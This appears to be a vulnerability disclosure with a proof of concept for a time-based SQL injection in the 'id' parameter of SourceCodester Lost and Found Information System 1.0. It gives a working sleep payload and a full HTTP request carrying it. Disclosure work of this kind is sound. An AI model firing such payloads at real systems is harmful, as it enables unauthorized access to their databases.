#SOURCECODESTER LOST AND FOUND INFORMATION SYSTEM 1.0 GET PARAMETER inquiries/view_inquiry ID SQL INJECTION

##Vendor Homepage:
https://www.sourcecodester.com

##Software Link:
LOST AND FOUND INFORMATION SYSTEM
https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html

##Tested On:
Window 11, XAMPP

##Affected Page:
php-lfis/admin/?page=inquiries/view_inquiry&id=

##Description:
A vulnerability SQL injection was found in SourceCodester Lost and Found Information System 1.0. It has been classified as critical. SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.

##Proof of Concept:
###1. Visit page: /php-lfis/admin/?page=inquiries/view_inquiry&id=1
###2. Intercept request and inject payload sql query in param 'id' to sleep 5 second: 
```
'+AND+(SELECT+1200+FROM+(SELECT(SLEEP(5)))pTou)+AND+'str'%3d'str
```
![image](https://github.com/nguyendinhmanh1111/CVE2023/assets/76999751/f960b8ed-1046-424f-9a6a-2c4c77183eaa)
####Request:
```
GET /php-lfis/admin/?page=inquiries/view_inquiry&id=1'+AND+(SELECT+1200+FROM+(SELECT(SLEEP(5)))pTou)+AND+'str'%3d'str HTTP/1.1
Host: 192.168.0.106
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/php-lfis/admin/?page=items
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=0bb98mm26ain42g80sto1khd1r
Connection: close˛
```
